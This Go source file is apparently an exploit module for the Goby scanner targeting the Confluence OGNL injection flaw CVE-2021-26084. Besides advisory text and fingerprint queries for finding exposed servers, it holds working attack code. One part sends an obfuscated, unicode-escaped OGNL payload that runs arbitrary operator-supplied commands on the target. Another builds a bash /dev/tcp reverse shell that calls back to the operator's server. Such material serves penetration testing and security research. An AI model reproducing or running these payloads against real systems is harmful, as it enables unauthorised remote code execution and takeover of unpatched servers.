package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Atlassian Confluence RCE (CVE-2021-26084)",
    "Description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG &gt; User Management &gt; User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
    "Impact": "Atlassian Confluence RCE (CVE-2021-26084)",
    "Recommendation": "<p>Upgrade to the following security versions: 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0</p><p></p>",
    "Product": "Confluence",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Atlassian Confluence Webwork OGNL 注入漏洞 (CVE-2021-26084)",
            "Description": "<p>Atlassian Confluence Server是Atlassian公司的一套具有企业知识管理功能，并支持用于构建企业WiKi的协同软件的服务器版本。</p><p>Atlassian Confluence存在一个 OGNL 注入漏洞，允许经过身份验证的用户（在某些情况下未经身份验证的用户）在 Confluence 服务器或 Data Center实例上执行任意代码。</p>",
            "Impact": "<p><span style=\"font-size: 16px;\">Atlassian Confluence存在一个 OGNL 注入漏洞，漏洞文件在confluence/pages/createpage-entervariables.vm，queryString参数存在ognl注入漏洞，导致其允许经过身份验证的用户（在某些情况下未经身份验证的用户）在 Confluence 服务器或 Data Center实例上执行任意代码。</span><br></p><p>漏洞版本：<br>Atlassian Confluence Server<br>Atlassian Confluence Data Center</p><pre><code><span style=\"box-sizing: content-box; color: rgb(51, 51, 51);\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 4.x.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 5.x.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.0.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.1.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.2.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.3.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.4.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.5.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.6.x versions </span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.7.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.8.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.9.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.10.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.11.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.12.x versions </span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.13.x versions before 6.13.23</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.14.x versions </span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 6.15.x versions </span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.0.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.1.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.2.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.3.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.4.x versions before 7.4.11</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.5.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.6.x versions </span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.7.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.8.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.9.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.10.x versions</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.11.x versions before 7.11.6</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">All 7.12.x versions before 7.12.5</span></span></code></pre>",
            "Recommendation": "<p>官方已发布最新安全版本：<a href=\"https://www.atlassian.com/software/confluence/download-archives\">https://www.atlassian.com/software/confluence/download-archives</a></p><p>临时解决方案：<br>参考官方给出的安全脚本：<a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html#\">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html#</a></p>",
            "Product": "Atlassian Confluence",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Atlassian Confluence RCE (CVE-2021-26084)",
            "Description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
            "Impact": "Atlassian Confluence RCE (CVE-2021-26084)",
            "Recommendation": "<p>Upgrade to the following security versions: 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0<p>",
            "Product": "Confluence",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\"))",
    "GobyQuery": "((header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\"))",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2021-09-01",
    "References": [
        "https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.6",
    "CVEIDs": [
        "CVE-2021-26084"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,goby_shell_linux",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Confluence"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10222"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 1000 + rand.Intn(1000)
			Rand2 := 1000 + rand.Intn(1000)
			uri := "/pages/createpage-entervariables.action"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf(`queryString=aaaa\u0027%%2b#{%d*%d}%%2b\u0027bbb`, Rand1, Rand2)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				fmt.Println(strconv.Itoa(Rand1 * Rand2))
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "aaaa") && strings.Contains(resp.RawBody, strconv.Itoa(Rand1*Rand2))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/pages/createpage-entervariables.action"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					HostServer := godclient.GetGodServerHost()
					LinuxBashShell := fmt.Sprintf(`[\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027bash -i \u003e\u0026 /dev/tcp/%s/%s 0\u003e\u00261\u0027]`, HostServer, rp)
					cfg.Data = fmt.Sprintf(`queryString=aaa\u0027%%2b#{\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var x=new java.lang.ProcessBuilder;x.command(%s);x.start()\u0022)}%%2b\u0027`, LinuxBashShell)
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			if ss.Params["AttackType"].(string) == "cmd" {
				RandValue := goutils.RandomHexString(4)
				cfg.Data = fmt.Sprintf(`queryString=%s\u0027%%2b{Class.for\u004e\u0061\u006d\u0065(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isW\u0069n+%%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%%3b+var+cmd+%%3d+new+java.lang.String(\u0022%s\u0022)%%3bvar+p+%%3d+new+java.lang.ProcessBuilder()%%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%%3b+}p.redirectErrorStream(true)%%3b+var+pr\u006fcess%%3d+p.start()%%3b+var+\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0052\u0065\u0061\u0064\u0065\u0072+%%3d+new+\u006a\u0061\u0076\u0061.io.\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0052\u0065\u0061\u0064\u0065\u0072(process.getInputStream())%%3b+var+bufferedReader+%%3d+new+\u006a\u0061\u0076\u0061.io.BufferedReader(\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0052\u0065\u0061\u0064\u0065\u0072)%%3b+var+line+%%3d+\u0022\u0022%%3b+var+output+%%3d+\u0022\u0022%%3b+while((line+%%3d+bufferedReader.readLine())+!%%3d+null){output+%%3d+output+%%2b+line+%%2b+\u006a\u0061\u0076\u0061.lang.Character.toString(10)%%3b+}\u0027)}%%2b\u0027`, RandValue, cmd)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, RandValue) {
						body := regexp.MustCompile(`(?s)` + RandValue + `\[(.*?)\]"`).FindStringSubmatch(resp.RawBody)
						expResult.Output = body[1]
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
